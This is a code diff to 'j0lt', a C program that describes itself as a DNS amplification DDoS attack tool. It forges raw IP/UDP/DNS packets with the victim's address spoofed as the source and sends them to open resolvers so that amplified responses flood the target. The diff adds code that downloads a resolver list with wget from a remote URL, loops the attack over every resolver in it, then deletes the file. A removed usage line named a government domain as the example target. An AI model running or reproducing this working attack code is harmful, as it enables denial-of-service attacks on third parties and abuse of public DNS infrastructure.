@@ -3,10 +3,10 @@
  *     |__\   _  \ |  |_/  |_
  *     |  /  /_\  \|  |\   __\
  *     |  \  \_/   \  |_|  |                               2021
- * /\__|  |\_____  /____/__|                      the-scientist
+ * /\__|  |\_____  /____/__|         the-scientist:spl0its-r-us
  * \______|      \/              ddos amplification attack tool
  * ------------------------------------------------------------
- * > This is unpublished proprietary source code of:
+ * > This is unpublished proprietary source code of spl0its-r-us
  * the-scientist
  * tofu@rootstorm.com
  * ------------------------------------------------------------
@@ -20,7 +20,7 @@
  * > Usage: sudo ./j0lt <target> <port> <num-packets>
  * (the-scientist㉿rs)-[~/0day]$ gcc j0lt.c -o j0lt
  * (the-scientist㉿rs)-[~/0day]$ unshare -rn
- * (the-scientist㉿rs)-[~/0day]# ./j0lt mod.gov.cn 80 1337
+ * (the-scientist㉿rs)-[~/0day]# ./j0lt 127.0.0.1 80 1337
  * ------------------------------------------------------------
  * > What is DNS a amplification attack:
  * A type of DDoS attack in which attackers use publicly
@@ -30,32 +30,9 @@
  * be the target’s address. When the DNS server sends the
  * record response, it is sent to the target instead.
  * ------------------------------------------------------------
- * > Big hi to the only sane place left on the internet:
+ * > The only sane place left on the internet:
  * irc.efnet.org #c
  */
-
-#include <stdbool.h>
-#include <stddef.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <limits.h>
-#include <errno.h> 
-
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
-#include <arpa/nameser.h> 
-#include <arpa/nameser_compat.h>
-
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-
-#include <netdb.h>
-#include <unistd.h>
 
 const char* g_ansi = {
     "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
@@ -90,7 +67,7 @@ const char* g_ansi = {
     "░░░░░░░░░░░░░░░░                ░░░░░░░                   ░░░░░            \n"
     "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      \n"
     "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
-    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target server(spoof)   \n"
+    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target IPv4 (spoof)    \n"
     "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
     "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -n <num>        : num UDP packets to send\n"
     "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
@@ -103,6 +80,29 @@ const char* g_ansi = {
     "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     \n"
     "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com\n"
 };
+
+#include <stdbool.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <limits.h>
+#include <errno.h> 
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include <arpa/nameser.h> 
+#include <arpa/nameser_compat.h>
+
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+
+#include <netdb.h>
+#include <unistd.h>
 
 typedef struct __attribute__((packed, aligned(1))) {
     uint32_t sourceaddr;
@@ -184,167 +184,155 @@ DEFINE_INSERT_FN(qword, uint64_t)
 // END IPHEADER VALUES 
 
 // DNS HEADER VALUES 
-#define 	DNS_ID_J0LT 0x1337
-#define 	DNS_QR_J0LT 0 // query (0), response (1).
+#define     DNS_ID_J0LT 0x1337
+#define     DNS_QR_J0LT 0 // query (0), response (1).
 // OPCODE
-#define 	DNS_OPCODE_J0LT ns_o_query
+#define     DNS_OPCODE_J0LT ns_o_query
 // END OPCODE
-#define 	DNS_AA_J0LT 0 // Authoritative Answer
-#define 	DNS_TC_J0LT 0 // TrunCation
-#define 	DNS_RD_J0LT 1 // Recursion Desired 
-#define 	DNS_RA_J0LT 0 // Recursion Available
-#define 	DNS_Z_J0LT 0 // Reserved
-#define 	DNS_AD_J0LT 0 // dns sec
-#define 	DNS_CD_J0LT 0 // dns sec
+#define     DNS_AA_J0LT 0 // Authoritative Answer
+#define     DNS_TC_J0LT 0 // TrunCation
+#define     DNS_RD_J0LT 1 // Recursion Desired 
+#define     DNS_RA_J0LT 0 // Recursion Available
+#define     DNS_Z_J0LT 0 // Reserved
+#define     DNS_AD_J0LT 0 // dns sec
+#define     DNS_CD_J0LT 0 // dns sec
 // RCODE
-#define 	DNS_RCODE_J0LT ns_r_noerror
+#define     DNS_RCODE_J0LT ns_r_noerror
 // END RCODE
-#define 	DNS_QDCOUNT_J0LT 0x0001 // num questions
-#define 	DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
-#define 	DNS_NSCOUNT_J0LT 0x0000 // num authority RRs 
+#define     DNS_QDCOUNT_J0LT 0x0001 // num questions
+#define     DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
+#define     DNS_NSCOUNT_J0LT 0x0000 // num authority RRs 
 #define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
 // END HEADER VALUES
+
+// START SYSTEM() AND READ() 
+#define     MAXREAD_J0LT 0x30
+#define     NCOMMANDS_J0LT 3
+#define     COMMAND_PATH_J0LT 0
+#define     COMMAND_RM_J0LT 1
+#define     COMMAND_WGET_J0LT 2
+
+const char* g_commands[ NCOMMANDS_J0LT ] = {
+    "/tmp/resolv.txt",
+    "rm /tmp/resolv.txt",
+    "wget -O /tmp/resolv.txt https://raw.githubusercontent.com/thesc1entist/j0lt/main/j0lt-resolv.txt"
+};
+// END SYSTEM() AND READ() 
 
 typedef struct iphdr IPHEADER;
 typedef struct udphdr UDPHEADER;
 typedef HEADER DNSHEADER;
 
 bool
-InsertUDPHeader(uint8_t** buf,
-        size_t* buflen,
-        UDPHEADER* header,
-        PSEUDOHDR* pseudoheader,
-        const uint8_t* data
-);
-
+InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data);
 bool
-InsertIPHeader(uint8_t** buf,
-        size_t* buflen,
-        IPHEADER* header
-);
-
+InsertIPHeader(uint8_t** buf, size_t* buflen, IPHEADER* header);
 bool
-InsertDNSHeader(uint8_t** buf,
-        size_t* buflen,
-        const DNSHEADER* header
-);
-
+InsertDNSHeader(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
 bool
-InsertDNSQuestion(void** buf,
-        size_t* buflen,
-        const char* domain,
-        uint16_t query_type,
-        uint16_t query_class
-);
-
+InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
 void
-PackDNSHeader(DNSHEADER* dnshdr
-);
-
+PackDNSHeader(DNSHEADER* dnshdr);
 void
-PackUDPHeader(UDPHEADER* udphdr,
-        PSEUDOHDR* pseudohdr,
-        uint16_t spoofport,
-        size_t nwritten
-);
-
+PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten);
 void
-PackIPHeader(IPHEADER* iphdr,
-        PSEUDOHDR* pseudohdr,
-        uint32_t resolvip,
-        uint32_t spoofip,
-        size_t nwritten,
-        size_t udpsz
-);
-
+PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
 bool
-InsertData(void** dst,
-        size_t* dst_buflen,
-        const void* src,
-        size_t src_len
-);
-
+InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
-CheckSum(const uint16_t* addr,
-        size_t count
-);
-
+CheckSum(const uint16_t* addr, size_t count);
 bool
-SendPayload(const uint8_t* datagram,
-        uint32_t daddr,
-        uint16_t uh_dport,
-        size_t nwritten
-);
-
+SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 void
-PrintHex(const uint8_t* datagram,
-        size_t nwritten
-);
-
+PrintHex(void* data, size_t len);
 size_t
-ForgeJ0ltPacket(char* payload,
-        uint32_t resolvip,
-        uint32_t spoofip,
-        uint16_t spoofport
-);
+ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
+void
+Red(void);
+void
+Green(void);
+void
+Reset(void);
 
-#define DEBUG 0
+#define DEBUG 1
 int
 main(int argc, char** argv)
 {
-    const char* resolvip;
-    char payload[ NS_PACKETSZ ];
-    size_t szpayload;
+    FILE* fptr;
+    char payload[ NS_PACKETSZ ], lineptr[ MAXREAD_J0LT ];
+    size_t szpayload, nread;
     uint32_t spoofip, resolvip;
-    uint16_t spoofport;
+    uint16_t spoofport, attacksz;
 
     // TODO add optargs
-    if (argc != 4) { 
-        printf("%s", g_ansi);
+    if (argc != 4)
         goto fail_state;
-    }
 
     spoofip = inet_addr(argv[ 1 ]); // spoofed ip address to victim
-    if (spoofip == 0) {
-        fprintf(stderr, "Invalid address\n");
-        exit(EXIT_FAILURE);
-    }
+    if (spoofip == 0)
+        goto fail_state;
+
     spoofip = htonl(spoofip);
 
     errno = 0;
     spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0); // port to victim
-    if (errno != 0) {
-        perror("Invalid port\n");
-        exit(EXIT_FAILURE);
-    }
-
-    //TODO: Add fopen() / fread() loop for resolver list
-    resolvip = inet_addr("");
-    if (resolvip != 0) {
-        resolvip = htonl(resolvip);
-    }
-
-    szpayload = ForgeJ0ltPacket(payload, resolvip, spoofip, spoofport);
-#if !DEBUG
-    if (SendPayload(payload, resolvip, NS_DEFAULTPORT, szpayload) == false)
+    attacksz = ( uint16_t ) strtol(argv[ 3 ], NULL, 0); // size of attack.
+    if (errno != 0)
         goto fail_state;
+
+    system(g_commands[ COMMAND_WGET_J0LT ]); // grab resolv list
+    fptr = fopen(g_commands[ COMMAND_PATH_J0LT ], "r");
+    if (fptr == NULL)
+        goto fail_state;
+
+    Green( );
+    printf("+ resolv list saved to %s\n", g_commands[ COMMAND_PATH_J0LT ]);
+    Reset( );
+    while (attacksz >= 1) {
+        Green( );
+        printf("+ current attack size %d \n", attacksz);
+        Reset( );
+        while (fgets(lineptr, MAXREAD_J0LT, fptr) != NULL) {
+            if (lineptr[ 0 ] == '#')
+                continue;
+            nread = strlen(lineptr);
+            lineptr[ nread - 1 ] = '\0';
+
+            resolvip = inet_addr(lineptr);
+            if (resolvip == 0)
+                continue;
+            resolvip = htonl(resolvip);
+
+            szpayload = ForgeJ0ltPacket(payload, resolvip, spoofip, spoofport);
+#if !DEBUG
+            if (SendPayload(payload, resolvip, NS_DEFAULTPORT, szpayload) == false)
+                goto fail_state;
 #else 
-    PrintHex(datagram, nwritten);
+            PrintHex(payload, szpayload);
 #endif
+        } // END INNER LOOP 
+        attacksz--;
+        rewind(fptr);
+    } // END OUTER LOOP
+
+    Red( );
+    printf("- removing resolv list from %s\n", g_commands[ COMMAND_PATH_J0LT ]);
+    Reset( );
+    system(g_commands[ COMMAND_RM_J0LT ]); // remove resolv list
+
+    fclose(fptr);
 
     return 0;
 fail_state:
+    printf("%s", g_ansi);
     perror("error");
     exit(EXIT_FAILURE);
 } // END MAIN
 
 
 size_t
-ForgeJ0ltPacket(char* payload,
-        uint32_t resolvip,
-        uint32_t spoofip,
-        uint16_t spoofport) {
-
+ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
+{
     const char* url = ".";  // . is for the biggest possible payload 
                             // Note: can be swapped for a list of urls
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
@@ -388,30 +376,28 @@ ForgeJ0ltPacket(char* payload,
     return nwritten;
 }
 
-void
-PrintHex(const uint8_t* datagram,
-        size_t nwritten) {
 
+void
+PrintHex(void* data, size_t len)
+{
+    const uint8_t* d = ( const uint8_t* ) data;
     size_t i, j;
-    for (j = 0, i = 0; i < nwritten; i++) {
+    for (j = 0, i = 0; i < len; i++) {
         if (i % 16 == 0) {
             printf("\n0x%.4x: ", j);
             j += 16;
         }
         if (i % 2 == 0)
-            printf(" ");
-        printf("%.2x", datagram[ i ]);
+            putchar(' ');
+        printf("%.2x", d[ i ]);
     }
-    putc('\n', stdout);
+    putchar('\n');
 }
 
 
 bool
-SendPayload(const uint8_t* datagram,
-        uint32_t daddr,
-        uint16_t uh_dport,
-        size_t nwritten) {
-
+SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
+{
     int raw_sockfd;
     ssize_t nread;
     struct sockaddr_in addr;
@@ -440,13 +426,8 @@ SendPayload(const uint8_t* datagram,
 
 
 void
-PackIPHeader(IPHEADER* iphdr,
-        PSEUDOHDR* pseudohdr,
-        uint32_t resolvip,
-        uint32_t spoofip,
-        size_t nwritten,
-        size_t udpsz) {
-
+PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz)
+{
     memset(iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IP_VER_J0LT;
     iphdr->ihl = IP_IHL_MIN_J0LT;
@@ -465,11 +446,8 @@ PackIPHeader(IPHEADER* iphdr,
 
 
 void
-PackUDPHeader(UDPHEADER* udphdr,
-        PSEUDOHDR* pseudohdr,
-        uint16_t spoofport,
-        size_t nwritten) {
-
+PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten)
+{
     memset(udphdr, 0, sizeof(UDPHEADER));
     udphdr->uh_dport = NS_DEFAULTPORT; // nameserver port
     udphdr->uh_sport = spoofport;    // victim port
@@ -480,8 +458,8 @@ PackUDPHeader(UDPHEADER* udphdr,
 
 
 void
-PackDNSHeader(DNSHEADER* dnshdr) {
-
+PackDNSHeader(DNSHEADER* dnshdr)
+{
     memset(dnshdr, 0, sizeof(DNSHEADER));
     dnshdr->id = DNS_ID_J0LT;
     dnshdr->rd = DNS_RD_J0LT;
@@ -502,10 +480,8 @@ PackDNSHeader(DNSHEADER* dnshdr) {
 
 
 bool
-InsertIPHeader(uint8_t** buf,
-        size_t* buflen,
-        IPHEADER* header) {
-
+InsertIPHeader(uint8_t** buf, size_t* buflen, IPHEADER* header)
+{
     bool status;
     uint8_t* bufptr = *buf;
     uint8_t first_byte;
@@ -534,12 +510,8 @@ InsertIPHeader(uint8_t** buf,
 
 
 bool
-InsertUDPHeader(uint8_t** buf,
-        size_t* buflen,
-        UDPHEADER* header,
-        PSEUDOHDR* pseudoheader,
-        const uint8_t* data) {
-
+InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data)
+{
     bool status;
     size_t totalsz =
         sizeof(PSEUDOHDR) + header->uh_ulen;
@@ -579,10 +551,8 @@ InsertUDPHeader(uint8_t** buf,
 
 
 bool
-InsertDNSHeader(uint8_t** buf,
-        size_t* buflen,
-        const HEADER* header) {
-
+InsertDNSHeader(uint8_t** buf, size_t* buflen, const HEADER* header)
+{
     bool status;
     uint8_t third_byte, fourth_byte;
 
@@ -618,12 +588,8 @@ InsertDNSHeader(uint8_t** buf,
 
 
 bool
-InsertDNSQuestion(void** buf,
-        size_t* buflen,
-        const char* domain,
-        uint16_t query_type,
-        uint16_t query_class) {
-
+InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
+{
     const char* token;
     char* saveptr, qname[ NS_PACKETSZ ];
     size_t srclen, domainlen, dif;
@@ -663,11 +629,8 @@ InsertDNSQuestion(void** buf,
 
 
 bool
-InsertData(void** dst,
-        size_t* dst_buflen,
-        const void* src,
-        size_t src_len) {
-
+InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
+{
     if (*dst_buflen < src_len)
         return false;
 
@@ -680,8 +643,8 @@ InsertData(void** dst,
 
 
 uint16_t
-CheckSum(const uint16_t* addr,
-        size_t count) {
+CheckSum(const uint16_t* addr, size_t count)
+{
     register uint64_t sum = 0;
 
     while (count > 1) {
@@ -696,4 +659,22 @@ CheckSum(const uint16_t* addr,
         sum = (sum & 0xffff) + (sum >> 16);
 
     return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
+}
+
+void
+Red(void)
+{
+    printf("\033[1;31m");
+}
+
+void
+Green(void)
+{
+    printf("\033[0;32m");
+}
+
+void
+Reset(void)
+{
+    printf("\033[0m");
 }
